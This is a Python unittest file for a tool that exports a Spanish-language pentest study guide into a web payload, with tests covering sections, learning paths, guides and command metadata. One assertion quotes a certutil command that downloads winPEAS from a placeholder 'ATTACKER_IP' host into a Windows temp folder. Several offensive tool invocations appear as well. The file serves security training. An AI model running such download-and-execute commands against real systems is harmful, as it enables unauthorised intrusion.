import unittest

from tools import export_web_content


class ExportWebContentTests(unittest.TestCase):
    def test_slugify_keeps_lookup_urls_stable(self):
        self.assertEqual(export_web_content.slugify("Windows local privilege escalation"), "windows-local-privilege-escalation")
        self.assertEqual(export_web_content.slugify("Web y APIs"), "web-y-apis")
        self.assertEqual(export_web_content.slugify("Enumeración de servicios"), "enumeracion-de-servicios")

    def test_normalize_sections_extracts_searchable_cards_and_commands(self):
        sections = [
            {
                "short": "Web y APIs",
                "summary": "De discovery web a bugs de autorizacion.",
                "blocks": [
                    ("p", "Busca rutas, sesiones y endpoints."),
                    ("code", ["ffuf -u http://$IP/FUZZ -w words.txt", "curl -i http://$IP"]),
                    ("table", [["Hallazgo", "Siguiente paso"], ["JWT", "Revisar alg y exp"]]),
                ],
            }
        ]

        payload = export_web_content.build_payload(sections)

        self.assertEqual(payload["stats"]["totalSections"], 1)
        self.assertEqual(payload["sections"][0]["slug"], "web-y-apis")
        self.assertIn("web", payload["sections"][0]["tags"])
        self.assertIn("ffuf -u http://$IP/FUZZ -w words.txt", payload["sections"][0]["commands"])
        self.assertIn("JWT Revisar alg y exp", payload["sections"][0]["searchText"])

    def test_payload_contains_decision_shortcuts_for_fast_entry(self):
        payload = export_web_content.build_payload(
            [
                {"short": "Checklist de atasco", "summary": "Preguntas para desbloquearse.", "blocks": []},
                {"short": "Credenciales y loot", "summary": "Buscar y reutilizar credenciales.", "blocks": []},
            ]
        )

        labels = [item["label"] for item in payload["shortcuts"]]

        self.assertIn("Estoy atascado", labels)
        self.assertIn("Tengo credenciales", labels)

    def test_load_source_sections_does_not_require_pdf_dependencies(self):
        sections = export_web_content.load_source_sections()

        self.assertGreaterEqual(len(sections), 10)
        self.assertEqual(sections[0]["short"], "Ultra quick start")

    def test_payload_exports_structured_learning_guides(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())

        self.assertEqual(payload["stats"]["totalGuides"], len(payload["guides"]))
        self.assertGreaterEqual(len(payload["guides"]), 8)

        for guide in payload["guides"]:
            self.assertTrue(guide["id"])
            self.assertTrue(guide["title"])
            self.assertTrue(guide["summary"])
            self.assertGreaterEqual(len(guide["steps"]), 3)
            for step in guide["steps"]:
                self.assertTrue(step["title"])
                self.assertTrue(step["idea"])
                self.assertIn("commands", step)

    def test_api_guide_has_five_bounded_steps(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        guide = next(item for item in payload["guides"] if item["id"] == "api-paso-a-paso")

        self.assertEqual(guide["section"], "web-apis-y-autorizacion")
        self.assertEqual(len(guide["steps"]), 5)
        self.assertTrue(all(len(step["commands"]) <= 3 for step in guide["steps"]))

    def test_web_section_includes_gobuster_command_alternatives(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        web_section = next(section for section in payload["sections"] if section["slug"] == "web-discovery")

        commands = "\n".join(web_section["commands"])

        self.assertIn("gobuster dir", commands)
        self.assertIn("gobuster vhost", commands)

    def test_web_section_includes_fuzzing_command_alternatives(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        web_section = next(section for section in payload["sections"] if section["slug"] == "web-discovery")

        commands = "\n".join(web_section["commands"])

        self.assertIn("wfuzz -c", commands)
        self.assertIn("arjun -u", commands)
        self.assertIn("feroxbuster -u $URL", commands)

    def test_web_split_sections_stay_focused(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        by_slug = {section["slug"]: section for section in payload["sections"]}

        for slug in ["web-discovery", "web-apis-y-autorizacion", "web-inyecciones", "web-ficheros-y-ejecucion"]:
            self.assertIn(slug, by_slug, f"missing web section: {slug}")

        # No single web section should re-accumulate the old 83-command wall.
        for slug in ["web-discovery", "web-apis-y-autorizacion", "web-inyecciones", "web-ficheros-y-ejecucion"]:
            self.assertLess(len(by_slug[slug]["commands"]), 40, f"{slug} is too dense")

    def test_api_learning_paths_are_separated_and_complete(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        paths = {path["id"]: path for path in payload["paths"]}

        self.assertEqual(
            paths["web-inyecciones-ruta"]["concepts"],
            ["ssti", "ssrf", "xxe", "xss", "file-upload", "filtros-incompletos", "command-injection"],
        )
        self.assertEqual(paths["web-pruebas-manuales-ruta"]["concepts"], ["burp-manual-testing", "client-side-controls"])
        self.assertEqual(
            paths["web-autorizacion-apis-ruta"]["concepts"],
            ["api-testing-model", "auth-session-security", "idor-bola", "jwt-security", "graphql-security", "oauth-oidc-cors"],
        )
        self.assertNotIn("web-inyecciones-y-autorizacion-ruta", paths)

    def test_learning_paths_stay_focused(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())

        for path in payload["paths"]:
            self.assertLessEqual(len(path["concepts"]), 7, f"ruta demasiado densa: {path['id']}")

    def test_full_guide_commands_are_merged_into_existing_sections(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())

        windows = next(section for section in payload["sections"] if section["slug"] == "windows-privesc")
        pivoting = next(section for section in payload["sections"] if section["slug"] == "pivoting")
        web_apis = next(section for section in payload["sections"] if section["slug"] == "web-apis-y-autorizacion")

        self.assertIn("certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe", windows["commands"])
        self.assertIn("sudo ip tuntap add user $USER mode tun ligolo", pivoting["commands"])
        self.assertIn("jwt_tool TOKEN", web_apis["commands"])
        self.assertGreaterEqual(payload["stats"]["totalCommands"], 200)

    def test_phase_is_inferred_from_primary_topic_before_broad_tags(self):
        payload = export_web_content.build_payload(
            [
                {
                    "short": "Windows privesc",
                    "summary": "Post-exploit Windows fuera de AD.",
                    "blocks": [("p", "Servicios, registry, credenciales y winPEAS.")],
                },
                {
                    "short": "Pivoting",
                    "summary": "Cuando el target ve servicios que tu Kali no ve.",
                    "blocks": [("p", "chisel, ligolo y proxychains.")],
                },
            ]
        )

        phases = {section["title"]: section["phase"] for section in payload["sections"]}

        self.assertEqual(phases["Windows privesc"], "privesc")
        self.assertEqual(phases["Pivoting"], "pivot")

    def test_every_concept_belongs_to_a_ruta(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        concept_ids = {c["id"] for c in payload["concepts"]}
        in_paths = {cid for p in payload["paths"] for cid in p["concepts"]}
        orphans = concept_ids - in_paths
        self.assertFalse(orphans, f"conceptos huerfanos (sin ruta): {sorted(orphans)}")

    def test_every_guide_section_exists(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        section_slugs = {s["slug"] for s in payload["sections"]}
        for guide in payload["guides"]:
            self.assertIn(guide["section"], section_slugs, f"guia {guide['id']} apunta a seccion inexistente")

    def test_pt1_priority_domains_have_learning_content(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        concepts = {concept["id"]: concept for concept in payload["concepts"]}
        guides = {guide["id"]: guide for guide in payload["guides"]}

        for concept_id in (
            "burp-manual-testing",
            "client-side-controls",
            "packet-analysis",
            "network-traffic-mitm",
            "network-segmentation-firewalls",
            "ad-tickets-trusts",
            "metasploit-workflow",
            "rules-of-engagement-scope",
            "persistence-cleanup-opsec",
            "pentest-reporting",
        ):
            self.assertIn(concept_id, concepts)
            self.assertTrue(concepts[concept_id]["confirmacion"])
            self.assertTrue(concepts[concept_id]["resultado"])

        paths = {path["id"]: path["concepts"] for path in payload["paths"]}
        self.assertEqual(
            paths["pt1-reporting-ruta"],
            ["rules-of-engagement-scope", "persistence-cleanup-opsec", "pentest-reporting"],
        )

        self.assertIn("pt1-engagement", guides)
        self.assertEqual(guides["pt1-engagement"]["section"], "notas-y-cierre")
        self.assertEqual(len(guides["pt1-engagement"]["steps"]), 5)

    def test_curated_tags_keep_filters_focused(self):
        payload = export_web_content.build_payload(
            [
                {"short": "Ultra quick start", "summary": "La hoja minima.", "blocks": [("p", "Menciona web, SMB y Windows como overview.")]},
                {"short": "Windows privesc", "summary": "Post-exploit Windows.", "blocks": [("p", "Servicios y registry.")]},
            ]
        )

        tags = {section["title"]: section["tags"] for section in payload["sections"]}

        self.assertEqual(tags["Ultra quick start"], ["recon", "workflow"])
        self.assertEqual(tags["Windows privesc"], ["windows"])

    def test_command_metadata_is_curated_and_attached_to_real_commands(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())

        self.assertGreaterEqual(payload["stats"]["totalCommandMetadata"], 20)
        self.assertEqual(payload["stats"]["totalCommandMetadata"], len(payload["commandMetadata"]))
        keys = {(section["slug"], command) for section in payload["sections"] for command in section["commands"]}
        for item in payload["commandMetadata"]:
            self.assertIn((item["sectionSlug"], item["command"]), keys)
            self.assertTrue(item["objective"])
            self.assertIn(item["noise"], export_web_content.ENUMS["noise"])
            self.assertIn(item["risk"], export_web_content.ENUMS["risk"])

    def test_command_metadata_validator_catches_orphans_duplicates_and_bad_enums(self):
        sections = [{"slug": "demo", "commands": ["echo ok"]}]
        item = {
            "sectionSlug": "missing", "command": "echo nope", "objective": "x", "tool": "sh",
            "environment": "kali", "targetOS": "linux", "credentialsRequired": False,
            "credentialType": "none", "privileges": "user", "noise": "quiet", "risk": "safe",
            "preconditions": [], "expectedOutput": "x", "successSignal": "x", "commonErrors": [],
            "alternative": "", "checkedVersion": "1.0", "reviewedAt": "2026-07-10",
        }
        errors = export_web_content.validate_command_metadata([item, dict(item)], sections)
        self.assertTrue(any("orphan" in error for error in errors))
        self.assertTrue(any("duplicate" in error for error in errors))
        self.assertTrue(any("invalid noise" in error for error in errors))


if __name__ == "__main__":
    unittest.main()
